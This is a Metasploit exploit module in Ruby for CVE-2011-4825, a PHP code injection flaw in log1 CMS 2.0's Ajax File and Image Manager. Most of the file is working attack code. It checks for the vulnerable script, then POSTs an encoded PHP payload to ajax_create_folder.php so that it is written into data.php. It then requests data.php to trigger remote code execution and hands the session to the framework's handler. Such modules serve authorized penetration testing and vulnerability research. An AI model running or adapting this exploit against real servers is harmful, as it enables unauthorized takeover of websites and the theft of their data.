# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Log1 CMS writeInfo() PHP Code Injection",
            &#039;Description&#039;    => %q{
                    This module exploits the "Ajax File and Image Manager" component that can be
                found in log1 CMS.  In function.base.php of this component, the &#039;data&#039; parameter
                in writeInfo() allows any malicious user to have direct control of writing data
                to file data.php, which results in arbitrary remote code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;EgiX&#039;,     #Found the bug in ajax_create_folder.php
                    &#039;Adel SBM&#039;, #Found log1 CMS using the vulnerable ajax_create_folder.php
                    &#039;sinn3r&#039;    #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-4825&#039;],
                    [&#039;OSVDB&#039;, &#039;76928&#039;],
                    [&#039;EDB&#039;, &#039;18075&#039;],  #Egix&#039;s advisory
                    [&#039;EDB&#039;, &#039;18151&#039;]   #Adel&#039;s
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;log1 CMS 2.0&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Apr 11 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to log1 CMS&#039;, &#039;/log1cms2.0/&#039;])
            ], self.class)
    end
 
 
    def check
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1, 1] != &#039;/&#039;
 
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}admin/libraries/ajaxfilemanager/ajax_create_folder.php"
        })
 
        if res and res.code == 200
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def exploit
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1, 1] != &#039;/&#039;
 
        peer = "#{rhost}:#{rport}"
        php = %Q|#{rand_text_alpha(10)}=<?php #{payload.encoded} ?>|
 
        print_status("#{peer} - Sending PHP payload (#{php.length.to_s} bytes)")
        send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}admin/libraries/ajaxfilemanager/ajax_create_folder.php",
            &#039;data&#039;   => php
        })
 
        print_status("#{peer} - Requesting data.php")
        send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}admin/libraries/ajaxfilemanager/inc/data.php"
        })
 
        handler
    end
end



